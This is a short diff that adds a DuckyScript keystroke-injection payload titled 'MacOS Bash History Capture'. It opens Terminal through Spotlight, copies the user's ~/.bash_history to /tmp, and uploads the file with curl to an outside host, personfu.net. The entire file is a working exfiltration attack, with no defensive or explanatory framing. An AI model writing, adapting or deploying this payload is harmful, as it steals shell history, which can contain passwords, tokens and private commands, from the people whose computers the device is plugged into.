@@ -1,0 +1,9 @@
+REM MacOS Bash History Capture
+DELAY 1000
+GUI SPACE
+DELAY 200
+STRING terminal
+ENTER
+DELAY 500
+STRING cat ~/.bash_history > /tmp/h; curl -F file=@/tmp/h http://personfu.net/upload
+ENTER
